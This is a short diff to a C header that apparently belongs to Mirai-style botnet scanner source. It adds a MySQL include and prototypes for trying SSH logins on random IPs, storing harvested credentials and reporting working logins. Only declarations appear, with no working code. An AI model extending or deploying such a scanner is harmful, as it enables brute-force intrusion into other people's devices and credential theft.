@@ -1,6 +1,7 @@
 #pragma once
 
 #include <stdint.h>
+#include <mysql/mysql.h>
 
 #include "includes.h"
 
@@ -50,6 +51,10 @@ void scanner_kill(void);
 
 static void setup_connection(struct scanner_connection *);
 static ipv4_t get_random_ip(void);
+
+int try_ssh_connection(char *ip, char *username, char *password);
+void store_auth_details(struct scanner_connection *conn, char *ip, int port, char *username, char *password);
+void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth);
 
 static int consume_iacs(struct scanner_connection *);
 static int consume_any_prompt(struct scanner_connection *);
